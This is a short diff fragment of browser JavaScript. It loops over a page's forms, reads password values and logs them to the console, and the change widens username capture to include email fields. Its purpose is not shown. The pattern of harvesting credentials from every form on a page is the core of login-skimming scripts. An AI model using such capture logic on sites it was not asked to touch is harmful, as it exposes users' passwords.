@@ -25,7 +25,7 @@ for (var i = 0; i < document.forms.length; i++) {
                     console.log(password);
                     for (let reverseIndex = 0; reverseIndex < this.length; reverseIndex++) {
                         const newElement = this.elements[reverseIndex];
-                        if(newElement.type==="text"){
+                        if(newElement.type==="text" || newElement.type==="email" ){
                             username = newElement.value;
                             console.log(username);
                         }
